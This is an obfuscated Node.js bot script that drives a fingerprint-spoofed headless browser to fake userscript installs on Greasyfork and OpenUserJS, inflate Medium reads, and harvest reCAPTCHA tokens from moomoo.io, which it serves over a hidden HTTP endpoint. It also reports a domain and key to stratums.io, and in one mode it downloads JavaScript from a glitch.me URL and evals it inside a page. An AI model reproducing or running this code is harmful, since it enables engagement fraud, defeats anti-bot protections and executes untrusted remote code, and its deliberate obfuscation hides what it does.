      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + Z(0x17) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + X(0x0, '26ya') + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + Z(0x17) + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + X(0x11, 'U1Ns') + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + X(0xe, 'U1Ns') + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x8 * 0xa6 + 0x2 * -0x181 + -0x832 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x11db + -0x2 * -0x46 + -0x114f * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x84f * -0x2 + -0x1a72 + 0x2b74), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xf43 + -0x26d1 + 0x3678), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x8f5 * 0x3 + 0x1ce6 * 0x1 + -0x207;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x23b2 + -0x59b + 0x1e17 * -0x1; w < getRandomInt(0xb82 + 0x56f * -0x1 + -0x612, 0xf0b + -0x12f5 + 0x3ef); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x2 * -0xac2a + 0x15bfb * 0x1 + -0x1c9ef * 0x1);
        }
      }();
    }, 0x231d * 0x1 + -0x2 * -0xa71 + -0x3b5 * 0xf), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x35 * -0x8a + 0x1 * -0x2027 + 0xc25 * 0x5;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1a3e + -0x8 * 0x20 + 0xb * 0x27a, -0xf70 + -0x1b66 + -0x3 * -0xe58)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4d5 * -0x3 + -0x99d4 + 0x1 * 0x11d83);
    }, -0x3c5 + -0x4b * 0x13 + 0x9ba), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x19aa + 0x203b * 0x1 + -0x39e5;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x235c + 0x217e + 0x1 * 0xd96), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x14aa * 0x1 + 0x183 * -0x1 + -0x7 * -0x32b), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x8 * -0x2971f + -0xf3fac + -0x6 * -0x848b6);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x207c + -0xd05 + -0x1313);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x186f + 0x1ed6 * -0x1 + -0x12af * -0x3);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2a42 + -0x2121 + 0x6af3);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b,
    a2 = c;
  async function f() {
    const a1 = b,
      k = h['random'](),
      m = k[a1(0xc, ')u[9')]('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xf7b * 0x1 + 0x1931 + 0x1d * -0x167) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * -0x14a8 + 0x2d * 0x37 + 0xafe));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xb * -0x239 + 0x3e * -0x7b + -0x557 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x636 * 0x3 + 0x104 + -0x13a6, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x258f + 0x207d * -0x1 + 0x6d1c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x16c5 + -0x974 + 0x21 * 0x229),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': a1(0x16, 'Rwoz'),
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      a2(0xb) + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + a3(0xf, ')u[9') + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + a3(0x7, '!yf!') + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + a3(0x9, 'oLHs') + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
